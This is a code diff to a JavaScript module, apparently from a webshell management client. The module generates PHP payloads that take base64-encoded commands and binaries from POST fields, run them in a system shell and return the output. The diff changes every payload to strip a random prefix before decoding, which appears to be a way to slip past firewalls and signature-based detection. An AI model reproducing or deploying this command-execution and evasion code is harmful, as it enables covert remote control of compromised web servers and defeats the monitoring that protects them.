@@ -4,9 +4,9 @@
 
 module.exports = (arg1, arg2, arg3) => ({
   exec: {
-    _: `$p=base64_decode($_POST["${arg1}"]);
-      $s=base64_decode($_POST["${arg2}"]);
-      $envstr=@base64_decode($_POST["${arg3}"]);
+    _: `$p=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));
+      $s=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));
+      $envstr=@base64_decode(substr($_POST["${arg3}"],#randomPrefix#));
       $d=dirname($_SERVER["SCRIPT_FILENAME"]);
       $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
       if(substr($d,0,1)=="/"){
@@ -102,20 +102,20 @@ module.exports = (arg1, arg2, arg3) => ({
       };
       $ret=@runcmd($r." 2>&1");
       print ($ret!=0)?"ret={$ret}":"";`.replace(/\n\s+/g, ''),
-    [arg1]: "#{base64::bin}",
-    [arg2]: "#{base64::cmd}",
-    [arg3]: "#{base64::env}"
+    [arg1]: "#{newbase64::bin}",
+    [arg2]: "#{newbase64::cmd}",
+    [arg3]: "#{newbase64::env}"
   },
   listcmd: {
-    _: `$arr=explode(",",base64_decode($_POST["${arg1}"]));
+    _: `$arr=explode(",",base64_decode(substr($_POST["${arg1}"],#randomPrefix#)));
     foreach($arr as $v){
         echo($v."\t".(file_exists($v)?"1":"0")."\n");
     }`.replace(/\n\s+/g, ''),
-    [arg1]: "#{base64::binarr}"
+    [arg1]: "#{newbase64::binarr}"
   },
   quote: {
-    _: `$p=base64_decode($_POST["${arg1}"]);$s=base64_decode($_POST["${arg2}"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";echo \`{$r} 2>&1\``,
-    [arg1]: "#{base64::bin}",
-    [arg2]: "#{base64::cmd}"
+    _: `$p=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));$s=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";echo \`{$r} 2>&1\``,
+    [arg1]: "#{newbase64::bin}",
+    [arg2]: "#{newbase64::cmd}"
   }
 })
